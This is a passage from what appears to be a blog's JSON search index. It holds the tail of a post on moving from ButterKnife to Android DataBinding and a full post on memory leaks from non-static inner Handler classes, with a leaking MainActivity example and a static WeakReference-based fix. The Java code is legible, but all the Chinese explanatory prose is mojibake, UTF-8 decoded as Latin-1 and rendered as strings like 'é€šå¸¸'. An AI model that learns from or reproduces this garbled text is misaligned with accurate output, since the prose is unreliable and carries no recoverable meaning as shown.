setDefaultComponentâ€¦Databindingè¿˜æœ‰å¾ˆå¤šé«˜çº§ç”¨æ³•ï¼Œç›®å‰ç»™æˆ‘å¸¦æ¥çš„å¥½å¤„å°±æ˜¯æ˜æ˜¾å‡å°‘äº†boilerplate code So ,æ„Ÿè°¢ButterKnifeç»™æˆ‘ä»¬å¸¦æ¥çš„ä¾¿åˆ©ï¼ŒGoogbye ButterKnifeï¼ŒHello DataBinding! ï¼Štodoï¼Š ### how did ButterKnife work?ButterKnifeåŸç†åŸºæœ¬ä¸Šä»ButterKnifeAnnotationProcess.processå¼€å§‹ Reference Data Binding Library data-binding-android-boyar-mount Advanced Data Bindinding Two-Way Data Binding at google io 2016 Android Dev Summit 2015 Goodbye Butter Knife Google Sample","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"databinding","slug":"databinding","permalink":"https://haldir65.github.io/tags/databinding/"},{"name":"Butterknife","slug":"Butterknife","permalink":"https://haldir65.github.io/tags/Butterknife/"}]},{"title":"androidå†…éƒ¨ç±»å¯¼è‡´leakæ¨¡æ¿","date":"2016-09-18T10:23:42.000Z","path":"2016/09/18/2016-09-18-android-inner-class-leak/","text":"é€šå¸¸æˆ‘ä»¬åœ¨ä¸€ä¸ªclassé‡Œé¢å†™å†…éƒ¨ç±»æ—¶ï¼Œä¸æ˜¯ä¸€å®šè¦ç”¨staticå£°æ˜ä¸ºé™æ€ç±»ï¼Œä½†æ˜¯æ¨èä½œä¸ºå†…éƒ¨é™æ€ç±»ï¼Œå› ä¸ºå†…éƒ¨ç±»ä¼šéšå¼æŒæœ‰å¤–éƒ¨ç±»çš„å¼•ç”¨ï¼Œæœ‰äº›æ—¶å€™å¦‚æœä»£ç å¤„ç†ä¸å¯¹å®¹æ˜“é€ æˆå†…å­˜æ³„æ¼ä¸‹é¢å°±æ˜¯ä¸ªå†…å­˜æ³„æ¼çš„ä¾‹å­ public class MainActivity extends Activity { public class MyHandler extends Handler{ @Override public void handleMessage(Message msg) { if(msg.what==1){ new Thread(){ @Override public void run() { while(true){ //do something } } }.start(); } } } public MyHandler handler; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); //... handler.sendEmptyMessage(1); finish(); } } å¦‚ä¸Šé¢ä»£ç æ‰€ç¤ºï¼Œåœ¨onCreateæ–¹æ³•é‡Œå‘é€äº†ä¸€æ¡æ¶ˆæ¯ç»™handlerå¤„ç†ç„¶åfinishæ–¹æ³•å…³é—­activityï¼Œä½†æ˜¯ä»£ç å¹¶ä¸èƒ½å¦‚æ„¿ï¼Œå› ä¸ºåœ¨handleræ”¶åˆ°æ¶ˆæ¯å¯åŠ¨äº†ä¸€ä¸ªçº¿ç¨‹å¹¶ä¸”æ˜¯æ­»å¾ªç¯ï¼Œè¿™æ—¶å€™ThreadæŒæœ‰handlerçš„å¼•ç”¨ï¼Œè€ŒhandleråˆæŒæœ‰activityçš„å¼•ç”¨ï¼Œè¿™å°±å¯¼è‡´äº†handlerä¸èƒ½å›æ”¶å’Œactivtyä¹Ÿä¸èƒ½å›æ”¶ï¼Œæ‰€ä»¥æ¨èä½¿ç”¨é™æ€å†…éƒ¨ç±»ï¼Œå› ä¸ºé™æ€å†…éƒ¨ç±»ä¸æŒæœ‰å¤–éƒ¨ç±»çš„å¼•ç”¨ï¼Œå¯ä»¥é¿å…è¿™äº›ä¸å¿…è¦çš„éº»çƒ¦ã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œåœ¨Activityé‡Œé¢åˆ›å»ºä¸€ä¸ªAsyncTaskçš„å­ç±»ä¹Ÿå®¹æ˜“å¯¼è‡´leakä¾‹å¦‚ stackoverFlowä¸Šçš„è¿™ä¸ªé—®é¢˜ å¯¹äºè¿™ç±»é—®é¢˜çš„æ¯”è¾ƒå¸¸ç”¨çš„æ–¹å¼:WeakReferenceä¾‹å¦‚,å†™è¿™æ ·ä¸€ä¸ªçš„é™æ€å†…éƒ¨ç±» private static class IncomingHandler extends Handler { private final WeakReference&lt;MessagingService&gt; mReference; IncomingHandler(MessagingService service) { mReference = new WeakReference&lt;&gt;(service); } @Override public void handleMessage(Message msg) { MessagingService service = mReference.get(); switch (msg.what) { case MSG_SEND_NOTIFICATION: int howManyConversations = msg.arg1 &lt;= 0 ? 1 : msg.arg1; int messagesPerConversation = msg.arg2 &lt;= 0 ? 1 : msg.arg2; if (service != null) { service.sendNotification(howManyConversations, messagesPerConversation); } break; default: super.handleMessage(msg); } } } //handleré€šè¿‡å¼±å¼•ç”¨æŒæœ‰serviceå¯¹è±¡ï¼Œå¤–åŠ staticå†…éƒ¨ç±»ä¸æŒæœ‰å¤–éƒ¨ç±»å¼•ç”¨ï¼Œåº”è¯¥ä¸ä¼šleakäº†","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]}]